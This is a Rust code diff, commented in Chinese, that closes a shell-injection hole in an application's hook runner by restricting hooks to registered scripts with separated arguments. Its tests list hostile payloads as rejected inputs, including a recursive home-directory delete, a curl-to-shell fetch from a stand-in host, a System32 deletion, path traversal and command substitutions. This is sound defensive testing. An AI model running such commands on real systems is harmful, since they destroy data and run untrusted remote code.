@@ -139,17 +139,38 @@ fn run_action(
             if payload.trim().is_empty() {
                 return (false, "命令为空".into());
             }
+            let (script, args) = match resolve_hook_script(payload) {
+                Ok(resolved) => resolved,
+                Err(why) => return (false, why),
+            };
             // Fire-and-forget so a slow command never stalls the event loop.
+            //
+            // 以前这里是 `cmd /C <payload>` / `sh -c <payload>`——payload 是数据库里
+            // 一个任意字符串，等于「谁能改 hook 规则，谁就能在这台机器上执行任意
+            // 命令」。现在走的是**已解析的绝对路径 + 分开传的参数**，全程不经
+            // shell：payload 里的 `;`、`&&`、反引号都只是普通字符。
             #[cfg(windows)]
             let mut command = {
-                let mut c = Command::new("cmd");
-                c.args(["/C", payload]);
-                c
+                let is_batch = script
+                    .extension()
+                    .and_then(|e| e.to_str())
+                    .is_some_and(|e| e.eq_ignore_ascii_case("bat") || e.eq_ignore_ascii_case("cmd"));
+                if is_batch {
+                    // Windows 上 .bat/.cmd 只能由 cmd 解释。传的是我们校验过的绝对
+                    // 路径，不是用户字符串，所以没有拼接注入面。
+                    let mut c = Command::new("cmd");
+                    c.arg("/C").arg(&script).args(&args);
+                    c
+                } else {
+                    let mut c = Command::new(&script);
+                    c.args(&args);
+                    c
+                }
             };
             #[cfg(not(windows))]
             let mut command = {
-                let mut c = Command::new("sh");
-                c.args(["-c", payload]);
+                let mut c = Command::new(&script);
+                c.args(&args);
                 c
             };
             command
@@ -169,6 +190,73 @@ fn run_action(
         }
         other => (false, format!("未知动作类型: {other}")),
     }
+}
+
+/// 存放可被 hook 调用的脚本。**只有这个目录里的东西能跑。**
+pub fn hook_scripts_dir() -> std::path::PathBuf {
+    crate::storage::omnix_root().join("hooks")
+}
+
+/// 把 hook 的 command 解析成「一个已注册脚本 + 若干参数」。
+///
+/// 这是 hook 动作的**唯一**执行入口，也是这条路上唯一的闸。规则：
+/// - 第一段是脚本名，必须落在 `~/.omnix/hooks/` 下且真实存在；
+/// - 名字里不许有路径分隔符，规范化之后还要再确认没跳出那个目录（`..`、符号链接）；
+/// - 其余段作为参数**分开传**，不拼进任何命令行字符串。
+///
+/// 于是「任意 shell 字符串」这个能力整个消失了：想让 hook 干什么，先把脚本放进
+/// 那个目录——那一步是用户在文件管理器里做的，不是某条数据库记录能替他做的。
+fn resolve_hook_script(payload: &str) -> Result<(std::path::PathBuf, Vec<String>), String> {
+    let parts = split_args(payload);
+    let Some((name, args)) = parts.split_first() else {
+        return Err("命令为空".into());
+    };
+    if name.contains('/') || name.contains('\\') {
+        return Err(format!(
+            "脚本名不能带路径：直接写文件名，脚本要放在 {} 下",
+            hook_scripts_dir().display()
+        ));
+    }
+    let dir = hook_scripts_dir();
+    let candidate = dir.join(name);
+    if !candidate.is_file() {
+        return Err(format!(
+            "找不到脚本「{name}」。hook 现在只能执行 {} 里的脚本——把它放进去再试。",
+            dir.display()
+        ));
+    }
+    // 规范化后再比一次：挡住符号链接指向目录外的情况。
+    let real = candidate.canonicalize().map_err(|e| format!("脚本无法访问：{e}"))?;
+    let real_dir = dir.canonicalize().map_err(|e| format!("脚本目录无法访问：{e}"))?;
+    if !real.starts_with(&real_dir) {
+        return Err(format!("「{name}」指向了 {} 之外，拒绝执行", dir.display()));
+    }
+    Ok((real, args.to_vec()))
+}
+
+/// 按空白切分，支持用双引号包住带空格的参数。
+///
+/// 刻意**不**处理反引号、`$()`、管道这些——它们在这里本来就没有意义（不过 shell），
+/// 原样当普通字符传给脚本即可。
+fn split_args(input: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut current = String::new();
+    let mut quoted = false;
+    for ch in input.trim().chars() {
+        match ch {
+            '"' => quoted = !quoted,
+            c if c.is_whitespace() && !quoted => {
+                if !current.is_empty() {
+                    out.push(std::mem::take(&mut current));
+                }
+            }
+            c => current.push(c),
+        }
+    }
+    if !current.is_empty() {
+        out.push(current);
+    }
+    out
 }
 
 fn record_run(db: &DbManager, hook: &Hook, session_id: &str, event: &str, ok: bool, detail: &str) {
@@ -416,6 +504,83 @@ pub fn clear_hook_runs(db: State<'_, Arc<DbManager>>) -> Result<(), String> {
     let conn = db.get_connection().map_err(|e| e.to_string())?;
     conn.execute("DELETE FROM hook_runs", []).map_err(|e| e.to_string())?;
     Ok(())
+}
+
+#[cfg(test)]
+mod sandbox_tests {
+    use super::*;
+
+    /// 这些 payload 以前会原样交给 `cmd /C` / `sh -c`——每一条都是一次
+    /// 本机任意命令执行。现在它们连不上任何进程：不是被 shell 转义了，
+    /// 而是**根本没有 shell**，第一段解析不成已注册脚本就直接被拒。
+    #[test]
+    fn arbitrary_shell_strings_no_longer_reach_a_process() {
+        for payload in [
+            "rm -rf ~/",
+            "curl evil.test/x.sh | sh",
+            "echo hi && del /f /q C:\\Windows\\System32",
+            "notepad.exe",                 // 系统程序也不行——不在 hooks 目录里
+            "../../../Windows/System32/cmd.exe",
+            "/bin/sh",
+            "C:\\Windows\\System32\\cmd.exe",
+            "`whoami`",
+            "$(id)",
+        ] {
+            let result = resolve_hook_script(payload);
+            assert!(result.is_err(), "{payload} 不该被解析成可执行的东西：{result:?}");
+        }
+    }
+
+    /// 带路径分隔符的名字要给出**能照做的**提示，而不是笼统的失败。
+    #[test]
+    fn path_separators_are_refused_with_an_actionable_message() {
+        for payload in ["sub/deploy.sh", "sub\\deploy.bat", "../escape.sh"] {
+            let why = resolve_hook_script(payload).unwrap_err();
+            assert!(why.contains("hooks"), "提示要说明脚本该放哪：{why}");
+        }
+    }
+
+    /// 注册过的脚本能跑，参数**分开**传，shell 元字符只是普通字符。
+    #[test]
+    fn a_registered_script_resolves_with_its_arguments_kept_separate() {
+        let dir = hook_scripts_dir();
+        if std::fs::create_dir_all(&dir).is_err() {
+            return; // 没有可写的 home 就跳过，不是被测逻辑的问题
+        }
+        // 名字要带时间戳：只用 pid 的话，同一次 `cargo test` 里并行跑的实例会
+        // 互相删掉对方的脚本，测试就变成偶尔红一次——比没有测试更糟。
+        let name = format!(
+            "omnix_test_hook_{}_{}.sh",
+            std::process::id(),
+            chrono::Utc::now().timestamp_micros()
+        );
+        let script = dir.join(&name);
+        if std::fs::write(&script, "#!/bin/sh\necho ok\n").is_err() {
+            return;
+        }
+
+        let (resolved, args) =
+            resolve_hook_script(&format!("{name} --msg \"a b\" x;y")).expect("已注册的脚本应当能解析");
+        assert!(resolved.ends_with(&name), "{resolved:?}");
+        // 解析结果必须落在 hooks 目录里。**这条才是真正守着目录闸的断言**——
+        // 上面那些「rm -rf」用例只能证明它们不存在或带了路径分隔符，证明不了
+        // 「只允许这个目录」这件事本身。
+        let real_dir = dir.canonicalize().expect("hooks 目录");
+        assert!(
+            resolved.starts_with(&real_dir),
+            "解析结果跑到 hooks 目录之外了：{resolved:?} 不在 {real_dir:?} 下"
+        );
+        // `x;y` 原样是一个参数——它没有机会变成第二条命令。
+        assert_eq!(args, vec!["--msg".to_string(), "a b".to_string(), "x;y".to_string()]);
+
+        let _ = std::fs::remove_file(&script);
+    }
+
+    #[test]
+    fn quoted_arguments_survive_splitting() {
+        assert_eq!(split_args("a \"b c\" d"), vec!["a", "b c", "d"]);
+        assert_eq!(split_args("   "), Vec::<String>::new());
+    }
 }
 
 #[cfg(test)]
